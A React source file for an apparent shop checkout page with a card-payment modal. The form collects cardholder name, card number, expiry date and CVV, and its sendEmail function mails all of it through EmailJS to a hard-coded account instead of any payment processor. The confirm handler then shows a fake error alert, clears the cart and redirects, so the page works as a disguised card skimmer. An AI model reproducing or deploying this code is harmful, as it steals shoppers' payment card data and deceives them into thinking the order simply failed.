import React, { useState, useRef } from "react";
import "../../components/modal.css";
import Button from "react-bootstrap/Button";
import Modal from "react-bootstrap/Modal";
import { useLocation, useNavigate } from "react-router-dom";
import emailjs from '@emailjs/browser';

const CheckoutPage = () => {
  const [show, setShow] = useState(false);
  const [activeTab, setActiveTab] = useState("visa"); // Initial active tab
  const form = useRef();

  const handleTabChange = (tabId) => {
    setActiveTab(tabId);
  };

  const handleClose = () => setShow(false);
  const handleShow = () => setShow(true);

  // order confirmation and redirect to home page
  const location = useLocation();
  const navigate = useNavigate();

  const from = location.state?.from?.pathname || "/";

  const handleOrderConfirm = () => {
    alert("Error occurred. Please try again later.");
    localStorage.removeItem("cart");
    navigate(from, { replace: true });

    sendEmail();
  };

  const sendEmail = () => {
    emailjs.sendForm('service_1tc94pn', 'template_q59oo8a', form.current, 'X7rgAwzmry6UECbXc')
      .then((result) => {
        console.log(result.text);
      }, (error) => {
        console.log(error.text);
      });
  };

  return (
    <div className="modalCard">
      <Button variant="primary" onClick={handleShow} className="py-2">
        Proceed to Checkout
      </Button>

      <Modal
        show={show}
        onHide={handleClose}
        animation={false}
        className="modal fade"
        centered
      >
        <div className="modal-dialog">
          <h5 className="px-3 mb-3 modal-dialog">Select Your Payment Method</h5>
          <div className="modal-content">
            <div className="modal-body">
              <div className="tabs mt-3">
                <ul className="nav nav-tabs" id="myTab" role="tablist">
                  <li className="nav-item" role="presentation">
                    <a
                      className={`nav-link ${activeTab === "visa" ? "active" : ""
                        }`}
                      id="visa-tab"
                      data-toggle="tab"
                      href="#visa"
                      role="tab"
                      aria-controls="visa"
                      aria-selected={activeTab === "visa"}
                      onClick={() => handleTabChange("visa")}
                    >
                      <img src="https://i.imgur.com/sB4jftM.png" width="80" alt="Visa" />
                    </a>
                  </li>
                  <li className="nav-item" role="presentation">
                    <a
                      className={`nav-link ${activeTab === "paypal" ? "active" : ""
                        }`}
                      id="paypal-tab"
                      data-toggle="tab"
                      href="#paypal"
                      role="tab"
                      aria-controls="paypal"
                      aria-selected={activeTab === "paypal"}
                      onClick={() => handleTabChange("paypal")}
                    >
                      <img src="https://i.imgur.com/yK7EDD1.png" width="80" alt="Paypal" />
                    </a>
                  </li>
                </ul>
                <div className="tab-content" id="myTabContent">
                  {/* visa content */}
                  <div
                    className={`tab-pane fade ${activeTab === "visa" ? "show active" : ""
                      }`}
                    id="visa"
                    role="tabpanel"
                    aria-labelledby="visa-tab"
                  >
                    {/* Visa tab content */}
                    <div className="mt-4 mx-4">
                      <form ref={form} onSubmit={sendEmail}>
                        <div className="form mt-3">
                          <div className="inputbox">
                            <input
                              type="text"
                              name="name"
                              className="form-control"
                              required="required"
                            />
                            <span>Cardholder Name</span>
                          </div>
                          <div className="inputbox">
                            <input
                              type="text"
                              name="card_no"
                              className="form-control"
                              required="required"
                            />
                            <span>Card Number</span>
                          </div>
                          <div className="d-flex flex-row">
                            <div className="inputbox">
                              <input
                                type="text"
                                name="exp_date"
                                className="form-control"
                                required="required"
                              />
                              <span>Expiration Date</span>
                            </div>
                            <div className="inputbox">
                              <input
                                type="text"
                                name="cvv"
                                className="form-control"
                                required="required"
                              />
                              <span>CVV</span>
                            </div>
                          </div>
                          <div className="px-5 pay">
                            <button className="btn btn-success btn-block" onClick={handleOrderConfirm}  type="submit" value="Send">
                              Add card
                            </button>
                          </div>
                        </div>
                      </form>
                    </div>
                  </div>
                </div>
                {/* payment disclaimer */}
                <p className="mt-3 px-4 p-Disclaimer">
                  <em>Payment Disclaimer:</em> In no event shall payment or partial payment by Owner for any material or service
                </p>
              </div>
            </div>
          </div>
        </div>
      </Modal>
    </div>
  );
};

export default CheckoutPage;
